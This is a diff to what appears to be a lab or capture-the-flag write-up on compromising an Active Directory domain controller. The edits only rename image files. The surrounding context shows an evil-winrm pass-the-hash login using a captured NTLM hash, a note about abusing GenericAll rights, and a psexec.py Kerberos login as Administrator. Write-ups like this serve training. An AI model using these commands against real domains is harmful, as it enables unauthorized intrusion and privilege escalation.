@@ -296,7 +296,7 @@ evil-winrm resourced.local -u l.livingston -H 19a3a7550ce8c505c2d46b5e39d6f808
 
 <figure><img src="../../../.gitbook/assets/image (2) (5).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption><p>User l.livingstone has GenericAll over an AD object</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption><p>User l.livingstone has GenericAll over an AD object</p></figcaption></figure>
 
 Now to exploit this...
 
@@ -406,4 +406,4 @@ Lastly, we can psexec into the target machine as the Administrator:
 python3 psexec.py -k -no-pass resourced.local/administrator@resourcedc.resourced.local -dc-ip 192.168.81.175
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (8).png" alt=""><figcaption></figcaption></figure>
